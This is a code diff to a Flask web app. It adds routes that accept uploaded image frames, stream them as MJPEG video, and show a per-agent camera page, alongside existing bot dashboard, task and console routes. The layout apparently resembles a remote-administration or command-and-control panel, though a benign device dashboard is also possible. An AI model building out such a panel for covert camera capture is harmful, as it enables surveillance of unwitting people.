@@ -1,4 +1,7 @@
-from flask import Blueprint, render_template, request, jsonify, redirect
+from flask import Blueprint, render_template, request, jsonify, redirect, Response
+import cv2,time
+import numpy as np
+
 
 bp = Blueprint('main', __name__)
 
@@ -64,6 +67,35 @@ def create_task():
 @bp.route("/dashboard", methods=["GET"])
 def dashboard():
     return render_template("pages/dashboard.html", bots= agents)
+
+@bp.route('/upload', methods=['POST'])
+def upload_frame():
+    global latest_frame
+    if 'image' in request.files:
+        file = request.files['image']
+        file_bytes = np.frombuffer(file.read(), np.uint8)
+        latest_frame = cv2.imdecode(file_bytes, cv2.IMREAD_COLOR)
+        return "Frame received", 200
+    return "Bad Request", 400
+
+def generate_mjpeg():
+    global latest_frame
+    while True:
+        if latest_frame is not None:
+            success, buffer = cv2.imencode('.jpg', latest_frame)
+            if success:
+                frame_bytes = buffer.tobytes()
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
+        time.sleep(0.03)
+
+@bp.route('/video_feed')
+def video_feed():
+    return Response(generate_mjpeg(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+@bp.route("/camera/<agent_id>", methods=["GET"])
+def camera(agent_id):
+    return render_template("pages/cam.html", id=agent_id) 
 
 @bp.route("/agent/<agent_id>/console", methods=["GET"])
 def console(agent_id):
